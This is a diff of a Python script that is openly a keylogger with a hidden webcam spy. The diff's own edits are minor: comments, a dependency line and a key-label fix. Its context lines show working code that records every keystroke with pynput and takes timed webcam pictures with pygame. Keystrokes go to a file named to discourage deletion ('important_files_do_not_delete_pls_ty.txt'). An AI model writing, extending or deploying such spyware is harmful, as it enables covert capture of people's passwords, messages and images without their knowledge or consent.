@@ -1,5 +1,5 @@
 # Dependencies: PYTHON3-PYNPUT
-
+# PYTHON3-PYGAME
 
 
 # Create two threads, one for listening to keyboard strokes and one for taking pictures
@@ -48,10 +48,16 @@ def webcam_pic():
             pygame.image.save(image,dtime_string)
             cam.stop()
 
+
+# Defining threads
+# note: keylogging already has a thread generated automatically
+# starting the camera thread
+
 webcampic = threading.Thread(target=webcam_pic)
 webcampic.start()
 
 # Keylogging mechanism
+
 
 keys_log = []
 
@@ -70,9 +76,9 @@ def write_file(keys):
         "Key.caps_lock": "<key_pressed_user_capsLock>",
         "Key.crtl": " <key_pressed_user_crtl>",
         "Key.alt": " <key_pressed_user_alt>",
-        #macos
+        #macos/windows
         #we don't really need anything else 
-        "Key.cmd": " <key_pressed_user_cmd",
+        "Key.cmd": " <key_pressed_user_cmd> "
     }
     
     with open(file_path + extend + "important_files_do_not_delete_pls_ty.txt", "a") as f:
@@ -84,7 +90,4 @@ with Listener(on_press=on_press, on_release=None) as listener:
     listener.join()
 
 
-# Defining threads
-# note: keylogging already has a thread generated automatically
-# starting the camera thread
    
